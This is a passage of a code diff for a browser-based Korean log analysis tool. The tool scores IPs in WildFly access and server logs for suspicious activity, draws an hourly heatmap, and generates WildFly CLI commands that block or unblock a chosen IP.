+    if(INJ_RE.test(e.path))t.push("인젝션시도");
+    if(e.status===401||e.status===403)t.push("인증실패");
+    else if(e.status>=500)t.push("서버오류");
+    else if(e.status===404)t.push("없는경로");
+    if(e.method&&!METHODS.has(e.method))t.push("비정상메서드");
+  }else{
+    if(AUTH_RE.test(e.msg))t.push("인증실패");
+    if(e.level==="ERROR"||e.level==="FATAL")t.push("서버오류");
+    if(INJ_RE.test(e.msg))t.push("인젝션시도");
+  }
+  e.tags=t;return e;
+}
+function parseText(text,file){
+  const out=[];let skipped=0;
+  const isServer=/^server\.log/.test(file);
+  for(const line of text.split(/\r?\n/)){
+    if(!line)continue;
+    if(!isServer){
+      const m=ACCESS_RE.exec(line);
+      if(m){const time=parseAccessTime(m[4]);
+        if(time){const rq=m[5].split(" ");
+          out.push(tag({time,ip:m[1],src:"access",file,method:rq[0]||"",path:rq[1]||"",
+            status:m[6]==="-"?0:+m[6],size:m[7]==="-"?0:+m[7],user:m[3]==="-"?"":m[3],agent:m[9]||""}));continue;}}
+    }
+    const s=SERVER_RE.exec(line);
+    if(s){const ips=new Set(s[9].match(IP_RE)||[]);
+      const [y,mo,d]=s[1].split("-").map(Number);
+      const time=new Date(y,mo-1,d,+s[2],+s[3],+s[4],+s[5]);
+      for(const ip of ips)out.push(tag({time,ip,src:"server",file,level:s[6],msg:s[9].slice(0,500),status:0,method:"",path:""}));
+    }else skipped++;
+  }
+  return {events:out,skipped};
+}
+async function readFile(f){
+  if(/\.gz$/i.test(f.name)){
+    if(!("DecompressionStream" in window))throw new Error(".gz 해제를 지원하지 않는 브라우저입니다. 압축을 풀어서 올려주세요.");
+    const ds=f.stream().pipeThrough(new DecompressionStream("gzip"));
+    return {name:f.name.replace(/\.gz$/i,""),text:await new Response(ds).text()};
+  }
+  return {name:f.name,text:await f.text()};
+}
+
+// ---------- IP / 대역 ----------
+function ip2n(ip){const p=ip.split(".");if(p.length!==4)return null;let n=0;for(const x of p){const v=+x;if(!/^\d+$/.test(x)||v>255)return null;n=n*256+v}return n}
+function matcher(q){
+  q=q.trim();const m=/^([\d.]+)\/(\d{1,2})$/.exec(q);
+  if(m){const base=ip2n(m[1]),bits=+m[2];if(base===null||bits>32)return null;
+    const size=2**(32-bits),start=Math.floor(base/size)*size;
+    return ip=>{const n=ip2n(ip);return n!==null&&n>=start&&n<start+size}}
+  return ip=>ip===q;
+}
+
+// ---------- 분석 ----------
+function analyze(evs,label){
+  evs.sort((a,b)=>a.time-b.time);
+  const acc=evs.filter(e=>e.src==="access");
+  const tc={};for(const e of evs)for(const t of e.tags)tc[t]=(tc[t]||0)+1;
+  const per={};let peak=0,peakAt=null;
+  for(const e of acc){const k=Math.floor(e.time/60000);per[k]=(per[k]||0)+1;if(per[k]>peak){peak=per[k];peakAt=new Date(k*60000)}}
+  const g=k=>tc[k]||0;let score=0;const why=[];
+  if(g("인젝션시도")){score+=50;why.push(`인젝션 시도 ${g("인젝션시도")}건 (SQL/스크립트/JNDI 패턴)`)}
+  if(g("스캔")>=3){score+=30;why.push(`관리·민감 경로 스캔 ${g("스캔")}건`)}else if(g("스캔")){score+=10;why.push(`관리·민감 경로 접근 ${g("스캔")}건`)}
+  if(g("인증실패")>=10){score+=30;why.push(`인증 실패 ${g("인증실패")}건 (무차별 대입 의심)`)}else if(g("인증실패")>=3){score+=10;why.push(`인증 실패 ${g("인증실패")}건`)}
+  if(peak>=120){score+=30;why.push(`분당 최대 ${peak}회 요청 (과도한 요청)`)}else if(peak>=60){score+=10;why.push(`분당 최대 ${peak}회 요청`)}
+  if(acc.length>=10&&g("없는경로")/acc.length>0.5){score+=10;why.push("요청의 절반 이상이 404 (경로 탐색 의심)")}
+  if(g("비정상메서드")){score+=10;why.push(`비표준 HTTP 메서드 ${g("비정상메서드")}건`)}
+  const level=score>=50?"hi":score>=20?"mid":"lo";
+  const status={};for(const e of acc)status[e.status]=(status[e.status]||0)+1;
+  const paths={};for(const e of acc)paths[e.path]=(paths[e.path]||0)+1;
+  return {label,evs,acc,tc,peak,peakAt,score,level,why:why.length?why:["특이 패턴 없음"],status,
+    topPaths:Object.entries(paths).sort((a,b)=>b[1]-a[1]).slice(0,8)};
+}
+const LV={hi:"높음",mid:"중간",lo:"낮음"};
+
+function cli(ip){
+  const safe=ip.replace(/[^0-9A-Za-z]/g,"_");
+  return {
+    block:[`/subsystem=undertow/configuration=filter/expression-filter=block-${safe}:add(expression="ip-access-control(default-allow=true, acl={'${ip} deny'})")`,
+      `/subsystem=undertow/server=default-server/host=default-host/filter-ref=block-${safe}:add`,":reload"].join("\n"),
+    unblock:[`/subsystem=undertow/server=default-server/host=default-host/filter-ref=block-${safe}:remove`,
+      `/subsystem=undertow/configuration=filter/expression-filter=block-${safe}:remove`,":reload"].join("\n")};
+}
+
+// ---------- 화면 ----------
+const $=id=>document.getElementById(id);
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const pad=n=>String(n).padStart(2,"0");
+const fmt=d=>d?`${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`:"-";
+const dayKey=d=>`${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}`;
+let ALL=[],BYIP=new Map(),SUMMARY=[],current=null,cellSel=null;
+
+function load(files,isExample){
+  ALL=[];const skipped=[];
+  for(const f of files){const r=parseText(f.text,f.name);ALL.push(...r.events);if(r.skipped)skipped.push([f.name,r.skipped])}
+  BYIP=new Map();for(const e of ALL){if(!BYIP.has(e.ip))BYIP.set(e.ip,[]);BYIP.get(e.ip).push(e)}
+  SUMMARY=[...BYIP.entries()].map(([ip,evs])=>{const r=analyze(evs.slice(),ip);return {ip,n:evs.length,level:r.level,score:r.score}})
+    .sort((a,b)=>b.score-a.score||b.n-a.n);
+  $("files").innerHTML=(isExample?'<b class="badge example">예시 데이터</b> ':'')+
+    files.map(f=>`<span>${esc(f.name)}</span>`).join("")+
+    (skipped.length?`<span class="mut" style="border:0">· 형식 인식 못한 줄: ${skipped.map(([n,c])=>esc(n)+" "+c+"줄").join(", ")}</span>`:"");
+  renderList();
+  if(SUMMARY.length)select(SUMMARY[0].ip);else $("report").innerHTML='<div class="panel empty">IP가 담긴 줄을 찾지 못했습니다. 로그 형식을 확인해 주세요.</div>';
+}
+function renderList(){
+  const q=$("ipq").value.trim();
+  const m=q.includes("/")?matcher(q):null;
+  const list=!q?SUMMARY:SUMMARY.filter(s=>m?m(s.ip):s.ip.includes(q));
+  $("ipcount").textContent=`${SUMMARY.length}개`;
+  $("iplist").innerHTML=list.map(s=>`<button class="iprow${current===s.ip?" on":""}" data-ip="${esc(s.ip)}">
+    <i class="dot ${s.level}" title="위험도 ${LV[s.level]}"></i><span class="ip">${esc(s.ip)}</span><small>${s.n}건</small></button>`).join("")||'<div class="empty">일치하는 IP 없음</div>';
+}
+function select(q){
+  const m=matcher(q);if(!m)return;
+  const evs=ALL.filter(e=>m(e.ip));current=q;cellSel=null;
+  renderList();renderReport(analyze(evs,q));
+}
+function renderReport(r){
+  const el=$("report");
+  if(!r.evs.length){el.innerHTML=`<div class="panel empty">${esc(r.label)} 기록이 없습니다.</div>`;return}
+  const first=r.evs[0].time,last=r.evs[r.evs.length-1].time;
+  // 타임테이블
+  const grid={},bad={};
+  for(const e of r.evs){const k=dayKey(e.time),h=e.time.getHours();(grid[k]??=Array(24).fill(0))[h]++;
+    if(e.tags.some(t=>t!=="없는경로"))(bad[k]??=Array(24).fill(0))[h]++}
+  const days=[];for(let d=new Date(first.getFullYear(),first.getMonth(),first.getDate());d<=last;d.setDate(d.getDate()+1))days.push(new Date(d));
+  const vmax=Math.max(1,...Object.values(grid).flat());
+  const wk="일월화수목금토";
+  const rows=days.map(d=>{const k=dayKey(d),row=grid[k]||Array(24).fill(0),b=bad[k]||[];
+    return `<tr><th class="day">${k.slice(5)} (${wk[d.getDay()]})</th>${row.map((v,h)=>{
+      const a=v?0.12+0.78*(v/vmax):0,isBad=b[h]>0;
+      const bg=v?`background:rgba(var(${isBad?"--heat-bad":"--heat"}),${a.toFixed(2)})`:"";
+      return `<td class="${isBad?"bad":""}" style="${bg}"><button data-d="${k}" data-h="${h}" title="${k} ${pad(h)}시 · ${v}건${isBad?` (의심 ${b[h]}건)`:""}" aria-label="${k} ${h}시 ${v}건">${v||""}</button></td>`}).join("")}</tr>`}).join("");
+  const isSingle=!r.label.includes("/");
+  const c=cli(r.label);
+  const stat=Object.entries(r.status).map(([k,v])=>`${k}:${v}`).join(" · ")||"-";
+  const steps={hi:["즉시 차단하세요. 아래 명령을 WildFly CLI에 붙여넣으면 이 IP는 403 응답을 받습니다.","방화벽·WAF·로드밸런서에서도 막는 것을 권장합니다. 서버 앞단에서 막아야 서버 부하가 줄어듭니다.","빨간 테두리 시간대를 눌러 무엇을 했는지 확인하고, 같은 시각 server.log ERROR와 앱 로그를 함께 보세요."],
+    mid:["당분간 지켜보세요. 며칠 뒤 로그를 다시 올려 분석합니다.","같은 패턴이 반복되면 아래 명령으로 차단합니다."],
+    lo:["정상 사용자로 보입니다. 조치가 필요 없습니다.","그래도 막아야 한다면 아래 명령을 사용합니다."]}[r.level];
+  el.innerHTML=`
+  <div class="panel risk ${r.level}">
+    <div><div class="mut" style="font-size:12px">위험도</div><div class="lvl">${LV[r.level]}</div><div class="mut num" style="font-size:12px">${r.score}점</div></div>
+    <div style="min-width:0"><h2 class="mono" style="overflow-wrap:anywhere">${esc(r.label)}</h2><ul>${r.why.map(w=>`<li>${esc(w)}</li>`).join("")}</ul></div>
+  </div>
+  <div class="stats">
+    <div class="stat"><span>최초 접속</span><b>${fmt(first)}</b></div>
+    <div class="stat"><span>마지막 접속</span><b>${fmt(last)}</b></div>
+    <div class="stat"><span>액세스 요청</span><b>${r.acc.length}건</b></div>
+    <div class="stat"><span>server.log 언급</span><b>${r.evs.length-r.acc.length}건</b></div>
+    <div class="stat"><span>분당 최대</span><b>${r.peak}회</b></div>
+    <div class="stat"><span>응답 코드</span><b style="font-size:13px">${stat}</b></div>
+  </div>
+  <div class="panel">
+    <h2>타임테이블 · 날짜 × 시간대</h2>
+    <div class="scroll"><table class="grid"><tr><th></th>${[...Array(24).keys()].map(h=>`<th>${pad(h)}</th>`).join("")}</tr>${rows}</table></div>
+    <div class="legend"><span><i style="background:rgba(var(--heat),.6)"></i>요청 건수 (진할수록 많음)</span>
+      <span><i style="background:rgba(var(--heat-bad),.6);box-shadow:inset 0 0 0 2px rgb(var(--heat-bad))"></i>의심 행동 포함</span>
+      <span>칸을 누르면 아래 상세 이력이 그 시간대만 보입니다</span></div>
+  </div>
+  <div class="panel">
+    <h2>권장 조치</h2>
+    <ol class="actions">${steps.map(s=>`<li>${esc(s)}</li>`).join("")}</ol>
+    ${isSingle?`<div style="margin-top:12px;display:flex;flex-direction:column;gap:8px">
+      <div class="note">입력 위치: WildFly 설치 폴더에서 <span class="mono">bin/jboss-cli.sh --connect</span> (윈도우는 <span class="mono">bin\\jboss-cli.bat --connect</span>) 실행 후 한 줄씩 붙여넣기</div>
+      <div class="note"><b>차단 명령</b></div><div class="cmd"><pre id="blk">${esc(c.block)}</pre><button data-copy="blk">복사</button></div>
+      <div class="note"><b>차단 해제 명령</b></div><div class="cmd"><pre id="unb">${esc(c.unblock)}</pre><button data-copy="unb">복사</button></div>
+      <div class="note">주의: 서버 앞에 로드밸런서·프록시가 있으면 로그와 차단에 보이는 IP가 프록시 IP일 수 있습니다. 이 경우 앞단 장비에서 차단하세요.</div>
+    </div>`:`<div class="note" style="margin-top:8px">대역 차단 명령은 단일 IP를 선택했을 때 표시됩니다.</div>`}
+  </div>
+  <div class="panel">
+    <div class="toolbar"><h2 style="margin:0">시간순 상세 이력 <span class="mut" id="flt"></span></h2>
+      <div style="display:flex;gap:6px;flex-wrap:wrap"><button id="onlybad">의심 행동만</button><button id="showall">전체 보기</button><button id="copycsv">CSV 복사</button></div></div>
+    <div class="detailbox"><table class="detail" id="detail"><thead><tr><th>시간</th><th>출처</th><th>내용</th><th>상태</th><th>태그</th></tr></thead><tbody></tbody></table></div>
+    <div class="note" id="dnote"></div>
+  </div>`;
+  const tbody=el.querySelector("#detail tbody");
+  const LIMIT=1000;
+  function fill(filter,label){
+    const list=r.evs.filter(filter);const shown=list.slice(-LIMIT);
+    tbody.innerHTML=shown.map(e=>{const what=e.src==="access"?`${esc(e.method)} ${esc(e.path)}`:`${esc(e.level)} ${esc(e.msg)}`;
+      const sc=e.status>=500?"s5":e.status>=400?"s4":"";
+      return `<tr><td class="t">${fmt(e.time)}</td><td>${e.src==="access"?"액세스":"server.log"}</td><td class="w">${what}</td><td class="num ${sc}">${e.status||""}</td><td>${e.tags.map(t=>`<span class="tag${t==="없는경로"?"":" warn"}">${esc(t)}</span>`).join("")}</td></tr>`}).join("");
+    el.querySelector("#flt").textContent=label?`· ${label}`:"";
+    el.querySelector("#dnote").textContent=list.length>LIMIT?`${list.length}건 중 최근 ${LIMIT}건만 표시합니다.`:`${list.length}건`;
+  }
+  fill(()=>true,"");
+  el.querySelectorAll(".grid td button").forEach(b=>b.onclick=()=>{
+    el.querySelectorAll(".grid td.sel").forEach(x=>x.classList.remove("sel"));b.parentElement.classList.add("sel");
+    const d=b.dataset.d,h=+b.dataset.h;fill(e=>dayKey(e.time)===d&&e.time.getHours()===h,`${d} ${pad(h)}시`)});
+  el.querySelector("#showall").onclick=()=>{el.querySelectorAll(".grid td.sel").forEach(x=>x.classList.remove("sel"));fill(()=>true,"")};
+  el.querySelector("#onlybad").onclick=()=>fill(e=>e.tags.some(t=>t!=="없는경로"),"의심 행동만");
+  el.querySelector("#copycsv").onclick=ev=>{
+    const q=s=>`"${String(s??"").replace(/"/g,'""')}"`;
+    const csv=["시간,IP,출처,파일,메서드,경로,상태,레벨,메시지,태그",...r.evs.map(e=>[fmt(e.time),e.ip,e.src,e.file,e.method,e.path,e.status||"",e.level||"",e.msg||"",e.tags.join(" ")].map(q).join(","))].join("\n");
+    copy(csv,ev.target)};
+  el.querySelectorAll("[data-copy]").forEach(b=>b.onclick=()=>copy(el.querySelector("#"+b.dataset.copy).textContent,b,el.querySelector("#"+b.dataset.copy)));
+}
+function copy(text,btn,pre){
+  const done=ok=>{const o=btn.textContent;btn.textContent=ok?"복사됨":"직접 선택해 복사하세요";setTimeout(()=>btn.textContent=o,1600)};
+  try{navigator.clipboard.writeText(text).then(()=>done(true),()=>{sel(pre);done(false)})}catch(e){sel(pre);done(false)}
+}
+function sel(node){if(!node)return;const r=document.createRange();r.selectNodeContents(node);const s=getSelection();s.removeAllRanges();s.addRange(r)}
+
+$("iplist").addEventListener("click",e=>{const b=e.target.closest(".iprow");if(b)select(b.dataset.ip)});
+$("ipq").addEventListener("input",renderList);
+$("ipq").addEventListener("keydown",e=>{if(e.key==="Enter"&&e.target.value.trim())select(e.target.value.trim())});
+async function handleFiles(list){
+  const files=[];
+  try{for(const f of list)files.push(await readFile(f))}catch(err){$("files").innerHTML=`<span style="color:var(--hi);border:0">${esc(err.message)}</span>`;return}
+  if(files.length)load(files,false);
+}
+$("file").addEventListener("change",e=>handleFiles(e.target.files));
+const drop=$("drop");
+["dragenter","dragover"].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.add("over")}));
+["dragleave","drop"].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.remove("over")}));
+drop.addEventListener("drop",e=>handleFiles(e.dataTransfer.files));
+
+load([{name:"access_log.example.log",text:$("sample-access").textContent.trim()},{name:"server.log",text:$("sample-server").textContent.trim()}],true);
+</script>
